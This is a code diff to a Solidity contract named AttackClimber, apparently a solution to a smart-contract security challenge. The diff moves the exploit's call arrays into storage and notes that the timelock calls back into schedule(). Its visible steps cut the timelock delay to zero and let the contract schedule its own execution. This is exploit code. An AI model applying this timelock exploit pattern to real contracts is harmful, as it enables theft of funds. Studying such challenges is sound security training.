@@ -23,17 +23,17 @@ contract AttackClimber {
     IClimberTimelock private climberTimelock;
     address private vault;
 
+    address[] private targets = new address[](4);
+    uint256[] private values = new uint256[](4);
+    bytes[] private dataElements = new bytes[](4);
+    bytes32 private salt = bytes32(uint256(1));
+
     constructor(address _climberTimelock, address _vault) {
         climberTimelock = IClimberTimelock(_climberTimelock);
         vault = _vault;
     }
 
     function attack() external {
-        address[] memory targets = new address[](4);
-        uint256[] memory values = new uint256[](4);
-        bytes[] memory dataElements = new bytes[](4);
-        bytes32 salt = bytes32(uint256(1));
-
         //Reduce timelock deplay to 0
         targets[0] = address(climberTimelock);
         values[0] = 0;
@@ -74,6 +74,7 @@ contract AttackClimber {
         climberTimelock.execute(targets, values, dataElements, salt);
     }
 
+    //Called by climberTimelock as last task during execute
     function schedule() external {
         climberTimelock.schedule(targets, values, dataElements, salt);
     }
